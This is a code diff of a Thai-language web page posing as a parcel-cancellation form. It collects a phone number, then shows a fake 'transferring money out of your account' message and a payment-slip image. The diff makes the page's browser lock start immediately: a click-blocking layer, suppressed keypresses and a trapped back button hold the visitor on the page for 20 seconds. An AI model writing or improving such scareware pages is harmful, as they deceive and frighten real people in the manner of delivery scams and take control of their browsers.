@@ -28,7 +28,7 @@
       z-index: 9999;
       padding: 16px;
       box-sizing: border-box;
-      overflow-y: auto; /* ✅ เลื่อนดูเฉพาะ overlay */
+      overflow-y: auto;
       overscroll-behavior: contain;
     }
 
@@ -108,7 +108,6 @@
       z-index: 10000;
     }
 
-    /* กล่องกรอกเบอร์ */
     #inputBox {
       background: linear-gradient(180deg,#0f1724 0%, #0b1220 100%);
       padding: 20px;
@@ -144,7 +143,6 @@
       box-shadow: 0 8px 20px rgba(255,222,0,0.12);
     }
 
-    /* ✅ ชั้นกันคลิก */
     #lockLayer {
       position: fixed;
       inset: 0;
@@ -160,16 +158,14 @@
     <h3>ยืนยันการยกเลิกพัสดุ</h3>
     <label for="phone">กรุณากรอกเบอร์โทรศัพท์</label>
     <input id="phone" type="tel" placeholder="เช่น 0912345678" />
-    <button id="startBtn">ยืนยันและแสดง</button>
+    <button id="startBtn">ยืนยัน</button>
   </div>
 
-  <!-- โหลด -->
   <div id="loading">
     <div class="spinner"></div>
     <div id="loadingText">กำลังโอนเงินออกจากบัญชี...</div>
   </div>
 
-  <!-- สลิป -->
   <div id="overlay">
     <div class="count-pill">เหลือ <span id="count">20</span> s</div>
     <div id="texts">
@@ -189,11 +185,9 @@
     <img id="mainImg" src="photo_2025-10-17_16-09-25.jpg" alt="ภาพสลิป" />
   </div>
 
-  <!-- ✅ ชั้นโปร่งใสกันคลิก -->
   <div id="lockLayer"></div>
 
   <script>
-    // ฟังก์ชันตรวจสอบเบอร์
     function isValidThaiPhone(s){
       return /^(0\d{9}|\+66\d{9})$/.test(s.trim());
     }
@@ -208,39 +202,38 @@
         return;
       }
 
+      // 🔒 ล็อกทันทีหลังจากกด
+      document.getElementById("lockLayer").style.display = "block";
+      document.addEventListener("keydown", e => e.preventDefault(), { passive: false });
+      history.pushState(null, "", location.href);
+      window.onpopstate = () => history.pushState(null, "", location.href);
+
+      // แสดงโหลด 2 วิ แล้วขึ้นสลิป
       document.getElementById("inputBox").style.display = "none";
       const loading = document.getElementById("loading");
       loading.style.display = "flex";
 
-      // หลังโหลด 2 วิ แสดงผล
       setTimeout(()=>{
         loading.style.display = "none";
         const overlay = document.getElementById("overlay");
         overlay.style.display = "flex";
         document.getElementById("showPhone").textContent = phone;
 
-        // 🔒 เริ่มล็อก — ไม่สามารถกด/แตะ/โทร ได้
-        document.getElementById("lockLayer").style.display = "block";
-        document.addEventListener("keydown", e => e.preventDefault(), { passive: false });
-        history.pushState(null, "", location.href);
-        window.onpopstate = () => history.pushState(null, "", location.href);
-
-        // ให้รูปขึ้นหลังข้อความครบ
+        // แสดงรูปหลังข้อความครบ
         setTimeout(()=>{
           document.getElementById("mainImg").classList.add("show");
         }, 8000);
 
-        // เริ่มนับถอยหลัง 20 วิ
+        // นับถอยหลัง 20 วิ
         remaining = 20;
         document.getElementById("count").textContent = remaining;
-
         clearInterval(timerId);
         timerId = setInterval(()=>{
           remaining--;
           document.getElementById("count").textContent = remaining;
           if(remaining <= 0){
             clearInterval(timerId);
-            document.getElementById("lockLayer").style.display = "none"; // ✅ ปลดล็อกหลังครบเวลา
+            document.getElementById("lockLayer").style.display = "none";
             window.location.reload();
           }
         },1000);
